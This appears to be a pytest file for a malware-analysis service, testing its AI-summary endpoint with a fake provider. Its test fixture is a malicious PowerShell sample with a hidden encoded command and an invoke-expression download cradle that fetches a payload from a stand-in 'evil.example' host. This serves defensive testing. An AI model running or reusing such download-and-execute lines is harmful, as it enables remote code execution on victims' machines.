"""End-to-end: /ai endpoint with an injected provider (no real Ollama needed)."""
import time

from app.services.ai import AIProvider, AIUnavailable

MALICIOUS_PS1 = (
    "powershell -nop -windowstyle hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA"
    'aAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQA' + "\r\n"
    "invoke-expression (New-Object Net.WebClient).DownloadString('http://evil.example/payload')" + "\r\n"
    "attacker@evil.example" + "\r\n"
    "C:\\Users\\victim\\AppData\\Roaming\\backup.exe" + "\r\n"
)

# each test uploads a byte-distinct sample so the duplicate-hash reuse path
# cannot inherit another test's cached AI result
_VARIANTS = {
    "validated": MALICIOUS_PS1 + "# variant: validated\n",
    "cached": MALICIOUS_PS1 + "# variant: cached\n",
    "unavailable": MALICIOUS_PS1 + "# variant: unavailable\n",
}


class FakeProvider(AIProvider):
    name = "fake"

    def __init__(self, down=False):
        self.down = down
        self.calls = 0

    def label(self):
        return "ollama/fake"

    def select_model(self):
        if self.down:
            raise AIUnavailable("cannot reach Ollama")
        return "fake-model"

    def generate(self, prompt, model):
        self.calls += 1
        return ('{"executive_summary": "A PowerShell downloader was identified.", '
                '"technical_summary": "Encoded PowerShell downloads a payload.", '
                '"threat_explanation": "The evidence shows scripted download activity.", '
                '"key_findings": ["Suspicious PowerShell", "Downloader behaviour"], '
                '"risk_factors": ["Encoded command", "External URL"], '
                '"mitre_explanation": [{"technique_id": "T1059.001", '
                '"explanation": "Encoded PowerShell execution"}], '
                '"recommendations": [{"priority": "high", "action": "Quarantine host"}], '
                '"confidence": 80, "business_impact": ["Credential exposure"], '
                '"limitations": ["Static analysis only — no execution observed"]}')


def _wait_completed(client, inv_id, timeout=20.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        inv = client.get(f"/api/investigations/{inv_id}").json()
        if inv["status"] == "completed":
            return inv
        time.sleep(0.25)
    raise AssertionError(f"analysis did not complete within {timeout}s (status={inv['status']})")


def _upload(client, variant="validated"):
    created = client.post(
        "/api/samples/upload",
        files={"file": ("ai_check.ps1", _VARIANTS[variant].encode(), "application/octet-stream")},
    ).json()["investigation"]
    _wait_completed(client, created["id"])
    return created["id"]


def test_ai_endpoint_returns_validated_structured_result(client, monkeypatch):
    monkeypatch.setattr("app.services.ai.providers.get_provider", lambda: FakeProvider())
    inv_id = _upload(client)

    res = client.get(f"/api/investigations/{inv_id}/ai").json()
    assert res["status"] == "completed"
    assert res["model"] == "fake-model"
    for field in ("executive_summary", "technical_summary", "threat_explanation",
                  "key_findings", "risk_factors", "mitre_explanation",
                  "recommendations", "confidence", "limitations", "provenance"):
        assert field in res
    # the AI can never add an IOC field or invent a score field
    assert "iocs" not in res

    # every explained technique must exist in the deterministic mapping
    mitre = client.get(f"/api/investigations/{inv_id}/mitre").json()["techniques"]
    det_ids = {m["technique_id"] for m in mitre}
    assert {m["technique_id"] for m in res["mitre_explanation"]} <= det_ids
    assert res["mitre_explanation"]  # the deterministic set must contain T1059.001


def test_ai_result_is_cached_after_first_call(client, monkeypatch):
    provider = FakeProvider()
    monkeypatch.setattr("app.services.ai.providers.get_provider", lambda: provider)
    inv_id = _upload(client, "cached")

    first = client.get(f"/api/investigations/{inv_id}/ai").json()
    second = client.get(f"/api/investigations/{inv_id}/ai").json()
    assert second["status"] == "completed"
    assert second["generated_at"] == first["generated_at"]  # served from cache
    assert provider.calls == 1


def test_ai_unavailable_keeps_deterministic_analysis_intact(client, monkeypatch):
    monkeypatch.setattr("app.services.ai.providers.get_provider", lambda: FakeProvider(down=True))
    inv_id = _upload(client, "unavailable")

    res = client.get(f"/api/investigations/{inv_id}/ai").json()
    assert res["status"] == "unavailable"
    assert "Ollama" in res["note"]

    # deterministic endpoints are untouched by the AI outage
    findings = client.get(f"/api/investigations/{inv_id}/findings").json()
    iocs = client.get(f"/api/investigations/{inv_id}/iocs").json()
    assert findings["status"] == "completed" and findings["findings"]
    assert iocs["status"] == "completed" and iocs["iocs"]
